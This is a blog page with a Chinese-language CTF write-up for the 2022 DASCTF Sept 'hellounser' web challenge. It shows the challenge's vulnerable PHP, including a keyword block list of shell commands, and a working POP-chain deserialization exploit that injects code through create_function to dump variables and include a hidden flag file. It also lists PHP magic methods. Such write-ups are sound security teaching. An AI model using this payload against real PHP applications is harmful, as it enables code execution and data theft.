@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Ex1Le23">
+
+
+
+
+
+<title>2022DASCTF Sept X 浙江工业大学秋季挑战赛 web | Stuuupid&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Stuuupid&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Stuuupid&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">2022DASCTF Sept X 浙江工业大学秋季挑战赛 web</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Ex1Le23</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 6, 2022&nbsp;&nbsp;0:31:41</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/wp-CTF/">wp-CTF</a>
+                            
+                                <a href="/categories/wp-CTF/web/">web</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>#hellounser<br>直接可读源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function show()&#123;</span><br><span class="line">        echo $this-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $arg;</span><br><span class="line">    </span><br><span class="line">    public function show()&#123;</span><br><span class="line">        $func = $this-&gt;func;</span><br><span class="line">        if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $this-&gt;func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;, $this-&gt;arg)) &#123; </span><br><span class="line">            die(&#x27;No!No!No!&#x27;); </span><br><span class="line">        &#125; else &#123; </span><br><span class="line">            include &quot;flag.php&quot;;</span><br><span class="line">            //There is no code to print flag in flag.php</span><br><span class="line">            $func(&#x27;&#x27;, $this-&gt;arg); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">        return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    $aaa = unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">    $aaa();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>审计代码发现需要GET方式传入”pop”，然后经反序列化后被调用。<br>A类中的<code>_invoke()</code>魔术方法能在A类被调用为函数时触发，从而调用<code>show()</code>函数，输出<code>$var</code>，而B类中的<code>_toString()</code>魔术方法能在B类被当作字符串使用时触发，若让<code>$var=B</code>类，则<code>_toString()</code>被触发时调用B的<code>show()</code>函数。<br>查看B类中<code>show()</code>函数，<code>func</code>、<code>arg</code>被绕过后则可包含”flag.php”文件，注释中提到不会输出，便只能依赖<code>$func</code>函数——有两个参数，且能执行任意命令，可利用<code>cretae_function</code>，既绕过了<code>func</code>的匹配，又可以执行（这里需要用<code>&#125;</code>闭合函数）。<br>由此构造如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a=new A();</span><br><span class="line">$b=new B();</span><br><span class="line"></span><br><span class="line">$b-&gt;func=&quot;create_function&quot;;</span><br><span class="line">$b-&gt;arg=&quot;&#125;var_dump(get_defined_vars());//&quot;;</span><br><span class="line">$a-&gt;var=$b;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+<p>传入<code>” cretae_function”</code>作为$函数名，然后将<code>&quot;&#125;var_dump(get_defined_vars());//&quot;</code>传入<code>arg</code>，从而绕过了匹配并执行<code>$func(&#39;&#39;, $this-&gt;arg); </code>，相当于执行如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create_function(&quot;&quot;,&#125;var_dump(get_defined_vars());//)</span><br><span class="line">也即---------&gt;</span><br><span class="line">cfunction(&quot;&quot;)&#123;</span><br><span class="line">&#125;var_dump(get_defined_vars());//&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的<code>var_dump()</code>函数可以输出变量的相关信息，显示关于一个或多个表达式的结构信息，包括表达式的类型与值（其中数组会递归展开值，通过缩进显示其结构）；而<code>get_defined_vars()</code>函数能返回由所有已定义变量所组成的数组，通过这两个函数能看到所有已定义变量。<br>经以上代码执行便可得到序列化<code>$a</code>的url编码，传入后得到<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220816220606569-998092554.png"><br>发现真正的flag藏在一个叫Tru3flag.php的文件里，因此base64绕过后，用<code>require()</code>函数包含执行[或者cat查看用取反绕过的办法]<br><code>require(base64_decode(VHJ1M2ZsYWcucGhw));</code><br>修改后的完整代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function show()&#123;</span><br><span class="line">        echo $this-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $arg;</span><br><span class="line">    </span><br><span class="line">    public function show()&#123;</span><br><span class="line">        $func = $this-&gt;func;</span><br><span class="line">        if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $this-&gt;func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;, $this-&gt;arg)) &#123; </span><br><span class="line">            die(&#x27;No!No!No!&#x27;); </span><br><span class="line">        &#125; else &#123; </span><br><span class="line">            include &quot;flag.php&quot;;</span><br><span class="line">            //There is no code to print flag in flag.php</span><br><span class="line">            $func(&#x27;&#x27;, $this-&gt;arg); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;show();  </span><br><span class="line">        return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new A();</span><br><span class="line">$b=new B();</span><br><span class="line"></span><br><span class="line">$b-&gt;func=&quot;create_function&quot;;</span><br><span class="line">$b-&gt;arg=&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;;</span><br><span class="line">$a-&gt;var=$b;</span><br><span class="line">/*</span><br><span class="line">create_function(&quot;&quot;,&#125;var_dump(get_defined_vars());//)</span><br><span class="line">---------&gt;</span><br><span class="line">cfunction(&quot;&quot;)&#123;</span><br><span class="line">&#125;var_dump(get_defined_vars());//&#125;</span><br><span class="line">*/</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到flag<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220816221213537-1615985978.png"></p>
+<hr>
+<p>附经常使用到的<strong>魔术方法</strong><br>（来自 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7ec82ffc457d">php反序列化漏洞之POP链构造</a>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__construct()  //当对象创建时触发</span><br><span class="line">__destruct()   //当对象销毁时触发</span><br><span class="line">__wakeup()     //当使用unserialize时触发</span><br><span class="line">__sleep()     //当使用serialize时触发</span><br><span class="line">__destruct()  //当对象被销毁时触发</span><br><span class="line">__call()      //当对象上下文中调用不可访问的方法时触发</span><br><span class="line">__get()       //当访问不可访问或不存在的属性时触发</span><br><span class="line">__set()       //当设置不可访问或不存在属性时触发</span><br><span class="line">__toString()  //当把类当作字符串使用时触发</span><br><span class="line">__invoke()    //当对象调用为函数时触发</span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Ex1Le23</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://ex1le23.github.io/2022/12/06/2022DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-web/">https://ex1le23.github.io/2022/12/06/2022DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-web/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/web/"># web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/12/06/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-web/">2022DASCTF MAY 出题人挑战赛 web</a>
+            
+            
+            <a class="next" rel="next" href="/2022/12/06/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88SSTI%EF%BC%89/">服务器端模板注入（SSTI）</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Ex1Le23 | Always Hold the Belief.</span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
